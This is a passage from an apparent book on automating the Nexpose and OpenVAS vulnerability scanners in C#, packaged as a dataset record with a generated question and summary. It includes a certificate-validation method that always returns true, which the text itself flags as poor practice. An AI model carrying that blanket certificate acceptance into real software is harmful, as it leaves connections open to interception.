and\npassword attributes. We pass the XDocument to the ExecuteCommand() method w\nand then store the result returned by the Nexpose server.\nAt x, we determine whether Nexpose’s XML response has a success\nattribute value of 1. If so, at y we assign the SessionID property to the\nsession-id in the response and set IsAuthenticated to true. Finally, we\nreturn the XML response z.\nThe ExecuteCommand() Method\nThe ExecuteCommand() method shown in Listing 6-5 is the real meat of the\nNexposeSession class.\npublic object ExecuteCommand(XDocument commandXml)\n{\nstring uri = string.Empty;\nswitch (this.uAPIVersion)\n{\ncase NexposeAPIVersion.v11:\nuri = \"/api/1.1/xml\";\nbreak;\ncase NexposeAPIVersion.v12:\nuri = \"/api/1.2/xml\";\nbreak;\ndefault:\nthrow new Exception(\"Unknown API version.\");\n}\nListing 6-5: The beginning of the NexposeSession class’s ExecuteCommand() method\nBefore we can send data to Nexpose, we need to know which ver-\nsion of the API to use, so at u we use a switch/case block (similar to\na series of if statements) to test the value of the APIVersion. A value of\nNexposeAPIVersion.v11 or NexposeAPIVersion.v12, for example, would tell us\nthat we need to use the API URI for version 1.1 or 1.2.\nMaking the HTTP Request to the Nexpose API\nHaving determined the URI to make the API request to, we can now send\nthe XML request data to Nexpose, as shown in Listing 6-6.\nbyte[] byteArray = Encoding.ASCII.GetBytes(commandXml.ToString());\nu HttpWebRequest request = WebRequest.Create(\"https://\" + this.Host\n+ \":\" + this.Port.ToString() + uri) as HttpWebRequest;\nrequest.Method = v\"POST\";\nrequest.ContentType = w\"text/xml\";\nrequest.ContentLength = byteArray.Length;\n120 Chapter 6\nusing (Stream dataStream = request.GetRequestStream())\ndataStream.xWrite(byteArray, 0, byteArray.Length);\nListing 6-6: Sending the XML command over HTTP for Nexpose inside ExecuteCommand()\nTalking to the HTTP API for Nexpose happens in two parts. First,\nNexpose makes the API request with the XML that will tell Nexpose what\ncommand we are running; then it reads the response with the results of\nthe API request. To make the actual HTTP request to the Nexpose API,\nwe create an HttpWebRequest u and assign its Method property to POST v, its\nContentType property to text/xml w, and the ContentLength property to the\nlength of our XML. Next, we write the API XML command bytes to the\nHTTP request stream and send the stream to Nexpose with Write() x.\nNexpose will parse the XML, determine what to do, and then return the\nresults in the response.\ntlS in Mono\nAs of this writing, the state of TLS in Mono is in flux . Support for TLS v1 .1 and\nv1 .2 has been written, but it is not currently shipped by default . Because of this,\nthe HTTP library may fail to make HTTPS requests and only output a cryptic\nexception about authentication failing . If this happens, it is because Nexpose\nis only allowing a TLS v1 .1 or v1 .2 connection and Mono can only support\nv1 .0 . To remedy this situation for testing purposes, you just need to add a line\nof code that will force Mono to proxy through Burp Suite, a tool we used in\nChapter 2 .\nTo do this, we can change the code in Listing 6-6 to the following code in\nListing 6-7 .\nrequest.Method = \"POST\";\nrequest.Proxy = new uWebProxy(\"127.0.0.1:8080\");\nrequest.ContentType = \"text/xml\";\nListing 6-7: Setting a proxy for TLS\nWe add a line to set the Proxy property of the request so that it points to a\nlistening Burp Suite proxy u . Burp Suite will happily negotiate a TLS v1 .0 connec-\ntion for our Mono client as well as a TLS v1 .1/1 .2 connection for the Nexpose\nserver . When the TLS issues have been ironed out—hopefully in the near\nfuture—the code in this book should work across platforms without this hack .\nReading the HTTP Response from the Nexpose API\nNext, we need to read the HTTP response from the API request we just\nmade. Listing 6-8 shows how we finish the ExecuteCommand() method by\nreading the HTTP response from Nexpose and then returning either an\nAutomating Nexpose 121\nXDocument or an array of raw bytes, depending on the HTTP response con-\ntent type. With Listing 6-8 finishing the ExecuteCommand() method, we will\nbe able to make an API request and then return the correct response data,\ndepending on the response content type.\nstring response = string.Empty;\nusing (HttpWebResponse r = request.uGetResponse() as HttpWebResponse)\n{\nusing (StreamReader reader = new vStreamReader(r.GetResponseStream()))\nresponse = reader.wReadToEnd();\nif (r.ContentType.Contains(x\"multipart/mixed\"))\n{\nstring[] splitResponse = response\n.Split(new string[] {y\"--AxB9sl3299asdjvbA\"}, StringSplitOptions.None);\nsplitResponse = splitResponse[2]\n.Split(new string[] { z\"\\r\\n\\r\\n\" }, StringSplitOptions.None);\nstring base64Data = splitResponse[1];\nreturn {Convert.FromBase64String(base64Data);\n}\n}\nreturn XDocument.Parse(response);\n}\nListing 6-8: The last part of the NexposeSession class’s ExecuteCommand() method\nUsually, when you send an XML command to Nexpose, you get XML\nin return. But when you request a vulnerability scan report, such as the\nPDF report we will request after performing a vulnerability scan, you get\nthe HTTP response multipart/mixed rather than application/xml. Exactly why\nNexpose changes the HTTP response based on PDF reports is not clear, but\nbecause our request may return a response with either a Base64-encoded\nreport or an XDocument (the XML document class we first used in Chapter 3),\nwe need to be able to handle both types of responses.\nIn order to begin reading the HTTP response from Nexpose, we\ncall GetResponse() u so that we can read the HTTP response stream; then\nwe create a StreamReader v to read the response data into a string w and\ncheck its content type. If the response type is multipart/mixed x, we break\nthe response into an array of strings so that we can parse the report data\nby leveraging the fact that Nexpose multipart/mixed responses always use\nthe string --AxB9sl3299asdjvbA y to separate the HTTP parameters in the\nHTTP response.\nAfter the HTTP response is split, the third element in the resulting\nstring array will always contain the Base64-encoded report data from\nthe scan. At z, we use two newline sequences (\\r\\n\\r\\n) to separate\nout this report data. Now we can reference only the Base64-encoded\ndata, but first we must remove some invalid data from the end of the\nBase64-encoded report. Finally, we pass the Base64-encoded data to\n122 Chapter 6\nConvert.FromBase64String() {, which returns a byte array of the Base64-\ndecoded data that can then be written to the filesystem as our final PDF\nreport to read later.\nLogging Out and Disposing of Our Session\nListing 6-9 shows the Logout() and Dispose() methods, which will make it\neasy for us to log out of our session and clean up any session data.\npublic XDocument uLogout()\n{\nXDocument cmd = new vXDocument(\nnew XElement(w\"LogoutRequest\",\nnew XAttribute(x\"session-id\", this.SessionID)));\nXDocument doc = (XDocument)this.ExecuteCommand(cmd);\nthis.yIsAuthenticated = false;\nthis.SessionID = string.Empty;\nreturn doc;\n}\npublic void zDispose()\n{\nif (this.{IsAuthenticated)\nthis.Logout();\n}\nListing 6-9: The NexposeSession class’s Dispose() and Logout() methods\nIn Logout() u, we build an XDocument v with the root node LogoutRequest w\nand the attribute session-id x. When we send this information to Nexpose\nas XML, it will attempt to invalidate the session ID token, effectively log-\nging us out. At the same time, we set IsAuthenticated y to false and SessionID\nto string.Empty to clean up the old authentication information; then we\nreturn the logout response XML.\nWe’ll use the Dispose() method z (required by the IDisposable interface)\nto clean up our Nexpose session. As you can see at {, we check whether we\nare authenticated and, if so, call Logout() to invalidate our session.\nFinding the API Version\nListing 6-10 shows how we’ll use NexposeAPIVersion to determine which\nNexpose API version to use.\npublic enum NexposeAPIVersion\n{\nv11,\nv12\n}\nListing 6-10: The NexposeAPIVersion enum used in the NexposeSession class\nAutomating Nexpose 123\nThe code enum NexposeAPIVersion gives us an easy way to determine which\nAPI URI to make HTTP requests to. We used NexposeAPIVersion in Listing 6-5\nto do exactly this when building the API URI in ExecuteCommand().\nDriving the Nexpose API\nListing 6-11 shows how we can now use NexposeSession to communicate with\nthe Nexpose API and authenticate and print the SessionID. This is a good\ntest to ensure the code we have written so far is working as expected.\nclass MainClass\n{\npublic static void Main(string[] args)\n{\nusing (NexposeSession session = new uNexposeSession(\"admin\", \"adm1n!\", \"192.168.2.171\"))\n{\nConsole.WriteLine(session.SessionID);\n}\n}\n}\nListing 6-11: Using NexposeSession to authenticate with the Nexpose API and print SessionID\nAt u, we attempt to authenticate by passing the username, password, and\nIP address of the Nexpose server to a new NexposeSession. If authentication\nsucceeds, we display the SessionID assigned to the session onscreen. If authen-\ntication fails, we throw an exception with the message “Authentication failed.”\nthe nexposeManager Class\nThe NexposeManager class shown in Listing 6-12 allows us to create, monitor,\nand report on the result of our scans. We begin with a simple API call.\npublic class NexposeManager : uIDisposable\n{\nprivate readonly NexposeSession _session;\npublic NexposeManager(vNexposeSession session)\n{\nif (!session.wIsAuthenticated)\nthrow new xArgumentException(\"Trying to create manager from \"\n+ \"unauthenticated session. Please authenticate.\", \"session\");\n_session = session;\n}\npublic XDocument yGetSystemInformation()\n{\nXDocument xml = new XDocument(\nnew XElement(\"zSystemInformationRequest\",\nnew XAttribute(\"session-id\", _session.SessionID)));\n{return (XDocument)_session.ExecuteCommand(xml);\n}\n124 Chapter 6\npublic void |Dispose()\n{\n_session.Logout();\n}\n}\nListing 6-12: The NexposeManager class with a GetSystemInformation() method\nBecause NexposeManager implements IDisposable u, we write a Dispose()\nmethod | by declaring the _session to hold the NexposeSession class that\nNexposeManager will consume, and we pass in NexposeSession v as the only\nargument. If the Nexpose session authenticates w, we assign _session to the\nsession. If not, we throw an exception x.\nTo test the manager class initially, we’ll implement a short and simple\nAPI method for retrieving some general system information about the\nNexpose console. The GetSystemInformation() method y makes a simple\nSystemInformationRequest API request z and then returns the response {.\nIn order to print the Nexpose system information (including version-\ning information, such as the PostgreSQL and Java versions in use, and\nhardware information, such as the CPU count and RAM available), we\nadd NexposeManager to our Main() method from Listing 6-11, as shown in\nListing 6-13.\npublic static void Main(string[] args)\n{\nusing (NexposeSession session = new NexposeSession(\"admin\", \"Passw0rd!\", \"192.168.2.171\"))\n{\nusing (NexposeManager manager = new uNexposeManager(session))\n{\nConsole.WriteLine(manager.vGetSystemInformation().ToString());\n}\n}\n}\nListing 6-13: Using the NexposeManager class in the Main() method\nWe pass our NexposeSession class into the NexposeManager constructor u\nand then call GetSystemInformation() v to print the system information, as\nshown in Figure 6-4.\nFigure 6-4: Getting the Nexpose system information via the API\nAutomating Nexpose 125\nautomating a Vulnerability Scan\nIn this section, we finally look at how to automate a vulnerability scan with\nNexpose. We create a Nexpose site, scan the site, and then download a\nreport of the findings. We’ll only scratch the surface of Nexpose’s power-\nful scanning features.\nCreating a Site with Assets\nBefore launching a scan with Nexpose, we need to create a site to be scanned.\nListing 6-14 shows how we can build the XML API request for creating a site\nin the CreateOrUpdateSite() method.\npublic XDocument uCreateOrUpdateSite(string name, string[] hostnames = null,\nstring[][] ips = null, int siteID = v-1)\n{\nXElement hosts = new wXElement(\"Hosts\");\nif (xhostnames != null)\n{\nforeach (string host in hostnames)\nhosts.Add(new XElement(\"host\", host));\n}\nif (yips != null)\n{\nforeach (string[] range in ips)\n{\nhosts.Add(new XElement (\"range\",\nnew XAttribute(\"from\", range[0]),\nnew XAttribute(\"to\", range[1])));\n}\n}\nXDocument xml = znew XDocument(\nnew XElement(\"SiteSaveRequest\",\nnew XAttribute(\"session-id\", _session.SessionID),\nnew XElement(\"Site\",\nnew XAttribute(\"id\", siteID),\nnew XAttribute(\"name\", name),\n{hosts,\nnew XElement(\"ScanConfig\",\nnew XAttribute(\"name\", \"Full audit\"),\nnew XAttribute(|\"templateID\", \"full-audit\")))));\nreturn (XDocument)_session.}ExecuteCommand(xml);\n}\nListing 6-14: The CreateOrUpdateSite() method in the NexposeManager class\nThe CreateOrUpdateSite() method u takes up to four arguments: the\nhuman-readable site name, any hostnames and IP ranges, and the site\nID. Passing -1 v as the site ID, as shown here, creates a new site. At w,\n126 Chapter 6\nwe create an XML element called Hosts, and if there is a hostnames argu-\nment that is not null x, we add it to Hosts. We do the same for any IP\nranges y passed as arguments.\nNext, we create an XDocument z with the root XML node SiteSaveRequest\nand a session-id attribute to tell the Nexpose server that we’re authen-\nticated and can make this API call. Inside the root node, we create an\nXElement called Site to hold specific information for the new site and scan\nconfiguration details, such as the hosts to scan { and the scan template\nID |. At }, we pass SiteSaveRequest to ExecuteCommand() and cast the object\nthat ExecuteCommand() returns to an XDocument.\nStarting a Scan\nListing 6-15 shows how to begin the site scan and get its status with the\nScanSite() and GetScanStatus() methods. Hopefully you’re beginning to see\nhow easy it can be to implement new API functionality in the Manager class\nwhen the NexposeSession class does all the communication and all you have\nto do is set up the API request XML.\npublic XDocument uScanSite(int vsiteID)\n{\nXDocument xml = wnew XDocument(\nnew XElement(x\"SiteScanRequest\",\nnew XAttribute(\"session-id\", _session.SessionID),\nnew XAttribute(\"site-id\", siteID)));\nreturn (XDocument)_session.ExecuteCommand(xml);\n}\npublic XDocument yGetScanStatus(int scanID)\n{\nXDocument xml = znew XDocument(\nnew XElement(\"ScanStatusRequest\",\nnew XAttribute(\"session-id\", _session.SessionID),\nnew XAttribute(\"scan-id\", scanID)));\nreturn (XDocument)_session.ExecuteCommand (xml);\n}\nListing 6-15: The ScanSite() and GetScanStatus() methods in the NexposeManager class\nThe ScanSite() method u takes the siteID v as an argument to scan.\nWe create an XDocument w with root node SiteScanRequest x and then add\nto it the session-id and site-id attributes. Next, we send the SiteScanRequest\nXML to the Nexpose server and return the response.\nThe GetScanStatus() method y accepts one argument, the scan ID to\ncheck, which is returned by the ScanSite() method. After creating a new\nXDocument z with root node ScanStatusRequest and adding the session-id and\nscan-id attributes, we send the resulting XDocument to the Nexpose server and\nreturn the response to the caller.\nAutomating Nexpose 127\nCreating a PdF Site report and deleting the Site\nListing 6-16 shows how we create the scan report and delete the site using\nthe API in the GetPdfSiteReport() and DeleteSite() methods.\npublic byte[] GetPdfSiteReport(int siteID)\n{\nXDocument doc = new XDocument(\nnew XElement(u\"ReportAdhocGenerateRequest\",\nnew XAttribute(\"session-id\", _session.SessionID),\nnew XElement(\"AdhocReportConfig\",\nnew XAttribute(\"template-id\", \"audit-report\"),\nnew XAttribute(\"format\", v\"pdf\"),\nnew XElement(\"Filters\",\nnew XElement(\"filter\",\nnew XAttribute(\"type\", \"site\"),\nnew XAttribute(\"id\", wsiteID))))));\nreturn (xbyte[])_session.ExecuteCommand(doc);\n}\npublic XDocument yDeleteSite(int siteID)\n{\nXDocument xml = new XDocument(\nnew XElement(z\"SiteDeleteRequest\",\nnew XAttribute(\"session-id\", _session.SessionID),\nnew XAttribute(\"site-id\", siteID)));\n{ return (XDocument)_session.ExecuteCommand(xml);\n}\nListing 6-16: The GetPdfSiteReport() and DeleteSite() methods in the NexposeManager class\nBoth methods take only one argument, the site ID. To generate a\nPDF report, we use ReportAdHocGenerateRequest u and specify pdf v and the\nsiteID w. We cast the object returned by ExecuteCommand() to a byte array x\ninstead of an XDocument because Nexpose will return a multipart/mixed\nHTTP response for a ReportAdHocGenerateRequest. We return the raw bytes\nof the PDF report to be written to the calling method.\nWe use DeleteSite() y to delete the site and create a SiteDeleteRequest\nXDocument z and then make the API call and return the results {.\nPutting it all together\nNow that you know how to drive Nexpose programmatically, let’s create\na new Nexpose site, scan it, create a PDF report of its vulnerabilities, and\ndelete the site. Listing 6-17 begins this process by creating a new site and\nretrieving its ID with our two new classes.\npublic static void Main(string[] args)\n{\nusing (NexposeSession session = new uNexposeSession(\"admin\", \"adm1n!\", \"192.168.2.171\"))\n128 Chapter 6\n{\nusing (NexposeManager manager = new vNexposeManager(session))\n{\nwstring[][] ips =\n{\nnew string[] { \"192.168.2.169\", xstring.Empty }\n};\nXDocument site = manager.yCreateOrUpdateSite(zGuid.NewGuid().ToString(), null, ips);\nint siteID = int.Parse(site.Root.Attribute(\"site-id\").Value);\nListing 6-17: Creating the temporary site and retrieving the site ID\nAfter creating the NexposeSession u and NexposeManager v objects, we pass\nin the list of IP addresses to scan as a string w, with a starting and ending\naddress. To scan a single IP, use an empty string as the second element, as\nshown at x. We pass the list of target IPs to CreateOrUpdateSite() y along with\na Guid z as the name of the temporary site. (We simply need a unique string\nfor the site name.) When we receive the HTTP response from Nexpose for\ncreating the temporary site, we grab the site ID from the XML and store it.\nStarting the Scan\nListing 6-18 shows how we run and monitor the vulnerability scan by basi-\ncally sitting in a while loop and sleeping until the scan is finished.\nXDocument scan = manager.uScanSite(siteID);\nXElement ele = scan.XPathSelectElement(\"//SiteScanResponse/Scan\");\nint scanID = int.Parse(ele.Attribute(\"scan-id\").Value);\nXDocument status = manager.vGetScanStatus(scanID);\nwhile (status.Root.Attribute(\"status\").Value != w\"finished\")\n{\nThread.Sleep(1000);\nstatus = manager.GetScanStatus(scanID);\nConsole.xWriteLine(DateTime.Now.ToLongTimeString()+\": \"+status.ToString());\n}\nListing 6-18: Starting and monitoring the Nexpose scan\nWe begin the scan by passing the site ID to ScanSite() u and then\ngrab the scan ID from the response and pass it to GetScanStatus() v. Next,\nin a while loop, we sleep for a few seconds, as long as the scan status is not\nfinished w. Then we check the scan status again and display a status mes-\nsage to the user with WriteLine() x.\nGenerating a Report and Deleting the Site\nOnce the scan finishes, we can generate a report and delete the site, as\nshown in listing 6-19.\nAutomating Nexpose 129",
    "question": "What is the process for automating the creation of a Nexpose site, initiating a vulnerability scan, generating a PDF report of the scan results, and then deleting the site using C#?",
    "summary": "Nexpose is a vulnerability scanner used for enterprise-level security management, allowing system admins to find, prioritize, and mitigate vulnerabilities. This chapter explains how to use C# to automate Nexpose by creating a site, scanning it, generating a PDF report, and deleting the site. The code involves two classes, NexposeSession and NexposeManager, which handle API communication and commands, respectively. It also addresses issues with TLS support in Mono and includes examples of API calls for system information, scanning, and report generation."
  },
  {
    "start": 89,
    "end": 119,
    "text": "byte[] report = manager.uGetPdfSiteReport(siteID);\nstring outdir = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);\nstring outpath = Path.Combine(outdir, vsiteID + \".pdf\");\nFile.wWriteAllBytes(outpath, report);\nmanager.xDeleteSite(siteID);\n}\n}\n}\nListing 6-19: Retrieving the Nexpose site report, writing it to the filesystem, and then deleting the site\nTo generate a report, we pass the site ID to GetPdfSiteReport() u, which\nreturns an array of bytes. Then we use WriteAllBytes() w to save the PDF\nreport to the user’s Desktop directory with the site’s ID as the filename v\nand a .pdf extension. Then we delete the site with DeleteSite() x.\nRunning the Automation\nListing 6-20 shows how to run a scan and view its report.\nC:\\Users\\example\\Documents\\ch6\\bin\\Debug>.\\06_automating_nexpose.exe\n11:42:24 PM: <ScanStatusResponse success=\"1\" scan-id=\"4\" engine-id=\"3\" status=u\"running\" />\n–-snip--\n11:47:01 PM: <ScanStatusResponse success=\"1\" scan-id=\"4\" engine-id=\"3\" status=\"running\" />\n11:47:08 PM: <ScanStatusResponse success=\"1\" scan-id=\"4\" engine-id=\"3\" status=v\"integrating\" />\n11:47:15 PM: <ScanStatusResponse success=\"1\" scan-id=\"4\" engine-id=\"3\" status=w\"finished\" />\nC:\\Users\\example\\Documents\\ch6\\bin\\Debug>dir \\Users\\example\\Desktop\\*.pdf\nVolume in drive C is Acer\nVolume Serial Number is 5619-09A2\nDirectory of C:\\Users\\example\\Desktop\n07/30/2017 11:47 PM 103,174 4.pdf x\n09/09/2015 09:52 PM 17,152,368 Automate the Boring Stuff with Python.pdf\n2 File(s) 17,255,542 bytes\n0 Dir(s) 362,552,098,816 bytes free\nC:\\Users\\example\\Documents\\ch6\\bin\\Debug>\nListing 6-20: Running the scan and writing the report to the user’s Desktop\nNotice in the output of Listing 6-20 that Nexpose is returning at least\nthree scan statuses, which are separate phases of the scan: running u, inte-\ngrating v, and finished w. Once the scan finishes, our PDF report is written\nto the user’s Desktop x, as expected. You can open this new report with your\nfavorite PDF reader and see what kind of vulnerabilities Nexpose may have\nfound.\n130 Chapter 6\nConclusion\nIn this chapter, you learned how to drive the vulnerability scanner Nexpose\nto report on vulnerabilities for a given host on a network. You also learned\nhow Nexpose stores information about computers on the network, such as\nsites and assets. You built a few classes to drive Nexpose programmatically\nusing the base C# libraries, and you learned how to use NexposeSession to\nauthenticate with Nexpose and send and receive XML to the Nexpose API.\nYou also saw how the NexposeManager class wraps functionality in the API,\nincluding the ability to create and delete sites. Finally, you were able to\ndrive Nexpose to scan a network asset and then create a nice-looking PDF\nreport displaying the results.\nNexpose has capabilities far beyond simple vulnerability management.\nExpanding your library to cover this advanced functionality should be rela-\ntively straightforward and is an excellent way to familiarize yourself with\nthe other powerful features Nexpose provides, such as custom scan policies,\nauthenticated vulnerability scans, and more customizable reporting. An\nadvanced, modern, mature enterprise network requires granular system\ncontrols that allow an organization to integrate security into business work-\nflows. Nexpose brings all of this to the table and is a powerful tool to have\nin your arsenal as an IT manager or system admin.\nAutomating Nexpose 131\n7\nau toMa tinG oPenVaS\nIn this chapter, I introduce you to OpenVAS\nand the OpenVAS Management Protocol\n(OMP), a free and open source vulnerabil-\nity management system forked from the last\nopen source release of Nessus. In Chapters 5 and 6,\nwe covered automating the proprietary vulnerability\nscanners Nessus and Nexpose, respectively. While\nOpenVAS has similar functionality, it’s another great\ntool to have in your arsenal.\nI show you how to drive OpenVAS to scan for and report on vulnerabili-\nties for hosts on your network using the core C# libraries and some cus-\ntom classes. By the time you’ve finished reading this chapter, you should\nbe able to assess any network-connected hosts for vulnerabilities with\nOpenVAS and C#.\ninstalling OpenVaS\nThe easiest way to install OpenVAS is to download the prebuilt OpenVAS\nDemo Virtual Appliance from http://www.openvas.org/. The file you’ll down-\nload is an .ova file (open virtualization archive) that should run in a vir-\ntualization tool like VirtualBox or VMware. Install VirtualBox or VMware\non your system and then open the downloaded .ova file to run it in your\nvirtualization tool of choice. (Give the OVA appliance at least 4GB of RAM\nto improve its performance.) The root password for the virtual appliance\nshould be root. You should use the root user when updating the appliance\nwith the latest vulnerability data.\nOnce you are logged in, update OpenVAS with the latest vulnerability\ninformation by entering the commands shown in Listing 7-1.\n# openvas-nvt-sync\n# openvas-scapdata-sync\n# openvas-certdata-sync\n# openvasmd --update\nListing 7-1: Commands used to update OpenVAS\nDepending on your internet connection, the updates may take a good\nwhile to complete. Once they are finished, try to connect to the openvasmd\nprocess on port 9390 and then run a test command as shown in Listing 7-2.\n$ openssl s_client <ip address>:9390\n[...SSL NEGOTIATION...]\n<get_version />\n<get_version_response status=\"200\" status_text=\"OK\"><version>6.0</version></get_version_response>\nListing 7-2: Connecting to openvasmd\nIf everything is working, you should see OK in the status message at the\nend of the output.\nBuilding the Classes\nLike the Nexpose API, OpenVAS transfers data to the server in XML. To\nautomate OpenVAS scans, we’ll use a combination of the Session and Manager\nclasses discussed in earlier chapters. The OpenVASSession class will take care\nof how we communicate with OpenVAS, as well as authentication. The\nOpenVASManager class will wrap common functionality in the API to make\nusing the API easy for a programmer.\nthe OpenVaSSession Class\nWe’ll use the OpenVASSession class to communicate with OpenVAS. Listing 7-3\nshows the constructor and properties that begin the OpenVASSession class.\n134 Chapter 7\npublic class OpenVASSession : IDisposable\n{\nprivate SslStream _stream = null;\npublic OpenVASSession(string user, string pass, string host, int port = u9390)\n{\nthis.ServerIPAddress = vIPAddress.Parse(host);\nthis.ServerPort = port;\nthis.Authenticate(username, password);\n}\npublic string Username { get; set; }\npublic string Password { get; set; }\npublic IPAddress ServerIPAddress { get; set; }\npublic int ServerPort { get; set; }\npublic SslStream Stream\n{\nwget\n{\nif (_stream == null)\nGetStream();\nreturn _stream;\n}\nxset { _stream = value; }\n}\nListing 7-3: The constructor and properties for the OpenVASSession class\nThe OpenVASSession constructor takes up to four arguments: a username\nand password to authenticate with OpenVAS (which is admin:admin by default\nin the virtual appliance); the host to connect to; and optionally the port to\nconnect to on the host, with a default of 9390 u.\nWe pass the host argument to IPAddress.Parse() v and assign the result\nto the ServerIPAddress property. Next, we assign the value of the port vari-\nable to the ServerPort property and pass the username and password to the\nAuthenticate() method if authentication succeeds (as discussed in the next\nsection). The ServerIPAddress and ServerPort properties are assigned in the\nconstructor and are used throughout the class.\nThe Stream property uses get w to see whether the private _stream mem-\nber variable is null. If so, it calls GetStream(), which sets x _stream with a con-\nnection to the OpenVAS server and then returns the _stream variable.\nAuthenticating with the OpenVAS Server\nTo attempt to authenticate with the OpenVAS server, we send an XML\ndocument with the username and password to OpenVAS and then read\nthe response, as shown in Listing 7-4. If authentication succeeds, we should\nbe able to call higher-privilege commands to designate a target to scan,\nretrieve a report, and so on.\nAutomating OpenVAS 135\npublic XDocument uAuthenticate(string username, string password)\n{\nXDocument authXML = new XDocument(\nnew XElement(\"authenticate\",\nnew XElement(\"credentials\",\nnew XElement(\"username\", vusername),\nnew XElement(\"password\", wpassword))));\nXDocument response = this.xExecuteCommand(authXML);\nif (response.Root.Attribute(y\"status\").Value != \"200\")\nthrow new Exception(\"Authentication failed\");\nthis.Username = username;\nthis.Password = password;\nreturn response;\n}\nListing 7-4: The OpenVASSession constructor’s Authenticate() method\nThe Authenticate() method u starts by accepting two arguments: the\nusername and the password to authenticate with OpenVAS. We create a\nnew authenticate XML command and use the username v and password w\nsupplied for the credentials; then we send the authentication request with\nExecuteCommand() x and store the response so we can ensure authentication\nwas successful and retrieve the authentication token.\nIf the status attribute y of the root XML element returned by the\nserver is 200, authentication was successful. We assign the Username proper-\nties, Password properties, and any arguments to the method, and then return\nthe authentication response.\nCreating a Method to Execute OpenVAS Commands\nListing 7-5 shows the ExecuteCommand() method, which takes an arbitrary\nOpenVAS command, sends it to OpenVAS, and then returns the result.\npublic XDocument ExecuteCommand(XDocument doc)\n{\nASCIIEncoding enc = new ASCIIEncoding();\nstring xml = doc.ToString();\nthis.Stream.uWrite(enc.GetBytes(xml), 0, xml.Length);\nreturn ReadMessage(this.Stream);\n}\nListing 7-5: The ExecuteCommand() method for OpenVAS\nTo execute commands with the OpenVAS Management Protocol, we\nuse a TCP socket to send XML to the server and receive XML in response.\n136 Chapter 7\nThe ExecuteCommand() method takes only one argument: the XML document\nto send. We call ToString() on the XML document, save the result, and then\nuse the Stream property’s Write() method u to write the XML to the stream.\nReading the Server Message\nWe use the ReadMessage() method shown in Listing 7-6 to read the message\nreturned by the server.\nprivate XDocument ReadMessage(SslStream usslStream)\n{\nusing (var stream = new vMemoryStream())\n{\nint bytesRead = 0;\nwdo\n{\nbyte[] buffer = new byte[2048];\nbytesRead = sslStream.xRead(buffer, 0, buffer.Length);\nstream.Write(buffer, 0, bytesRead);\nif (bytesRead < buffer.Length)\n{\nytry\n{\nstring xml = System.Text.Encoding.ASCII.GetString(stream.ToArray());\nreturn XDocument.Parse(xml);\n}\ncatch\n{\nzcontinue;\n}\n}\n}\nwhile (bytesRead > 0);\n}\nreturn null;\n}\nListing 7-6: The ReadMessage() method for OpenVAS\nThis method reads an XML document from the TCP stream in chunks\nand returns the document (or null) to the caller. After passing an sslStream u\nto the method, we declare a MemoryStream v, which allows us to dynamically\nstore the data we receive from the server. We then declare an integer to store\nthe number of bytes read and use a do/while loop w to create a 2048-byte\nbuffer to read the data into. Next, we call Read() x on the SslStream to fill\nthe buffer with the number of bytes read from the stream, and then we\ncopy the data coming from OpenVAS to the MemoryStream using Write() so\nwe can parse the data into XML later.\nIf the server returns less data than the buffer can contain, we need to\ncheck whether we have read a valid XML document from the server. To do\nso, we use GetString() within a try/catch block y to convert the bytes stored\nin the MemoryStream into a parseable string and attempt to parse the XML,\nAutomating OpenVAS 137\nsince parsing will throw an exception if the XML isn’t valid. If no excep-\ntion is thrown, we return the XML document. If an exception is thrown, we\nknow that we haven’t finished reading the stream, so we call continue z to\nread more data. If we finish reading bytes from the stream and have yet\nto return a valid XML document, we return null. This is a bit of defense,\nin case communication with OpenVAS is lost in the middle and we aren’t\nable to read the entire API response. Returning null allows us to check\nwhether the response from OpenVAS is valid later since null will only be\nreturned if we couldn’t read the full XML response.\nSetting Up the TCP Stream to Send and Receive Commands\nListing 7-7 shows the GetStream() method that first appears in Listing 7-3. It\nmakes the actual TCP connection to the OpenVAS server that we’ll use to\nsend and receive commands.\nprivate void GetStream()\n{\nif (_stream == null || !_stream.CanRead)\n{\nTcpClient client = new uTcpClient(this.ServerIPAddress.ToString(), this.ServerPort);\n_stream = new vSslStream(client.GetStream(), false,\nnew RemoteCertificateValidationCallback (ValidateServerCertificate),\n(sender, targetHost, localCertificates, remoteCertificate, acceptableIssuers) => null);\n_stream.wAuthenticateAsClient(\"OpenVAS\", null, SslProtocols.Tls, false);\n}\n}\nListing 7-7: The OpenVASSession constructor’s GetStream() method\nThe GetStream() sets up the TCP stream for use in the rest of the class\nwhen communicating with OpenVAS. To do this, we instantiate a new\nTcpClient u with the server by passing the ServerIPAddress and ServerPort\nproperties to TcpClient if the stream is invalid. We wrap the stream in an\nSslStream v that will not verify SSL certificates since the SSL certificates are\nself-signed and will throw an error; then we perform the SSL handshake\nby calling AuthenticateAsClient() w. The TCP stream to the OpenVAS server\ncan now be used by the rest of the methods when we begin sending com-\nmands and receiving responses.\nCertificate Validation and Garbage Collection\nListing 7-8 shows the methods used to validate SSL certificates (since the\nSSL certificates OpenVAS uses by default are self-signed) and clean up our\nsession once we’ve finished with it.\nprivate bool ValidateServerCertificate(object sender, X509Certificate certificate,\nX509Chain chain, SslPolicyErrors sslPolicyErrors)\n{\n138 Chapter 7\nreturn utrue;\n}\npublic void Dispose()\n{\nif (_stream != null)\nv_stream.Dispose();\n}\nListing 7-8: The ValidateServerCertificate() and Dispose() methods\nReturning true u is generally poor practice, but since in our case\nOpenVAS is using a self-signed SSL certificate that would not otherwise\nvalidate, we must allow all certs. As with earlier examples, we create the\nDispose() method so we can clean up after dealing with network or file\nstreams. If the stream in the OpenVASSession class isn’t null, we dispose of\nthe internal stream v used to communicate with OpenVAS.\nGetting the OpenVAS Version\nWe can now drive OpenVAS to send commands and retrieve responses,\nas shown in Listing 7-9. For instance, we can run commands such as the\nget_version command, which returns version information for the OpenVAS\ninstance. We’ll wrap similar functionality later in the OpenVASManager class.\nclass MainClass\n{\npublic static void Main(string[] args)\n{\nusing (OpenVASSession session = new uOpenVASSession(\"admin\", \"admin\", \"192.168.1.19\"))\n{\nXDocument doc = session.vExecuteCommand(\nXDocument.Parse(\"<get_version />\"));\nConsole.WriteLine(doc.ToString());\n}\n}\n}\nListing 7-9: The Main() method driving OpenVAS to retrieve the current version\nWe create a new OpenVASSession u by passing in a username, password,\nand host. Next, we pass ExecuteCommand() v an XDocument requesting the\nOpenVAS version, store the result in a new XDocument, and then write it to\nthe screen. The output from Listing 7-9 should look like Listing 7-10.\n<get_version_response status=\"200\" status_text=\"OK\">\n<version>6.0</version>\n</get_version_response>\nListing 7-10: The OpenVAS response to <get_version />\nAutomating OpenVAS 139\nthe OpenVaSManager 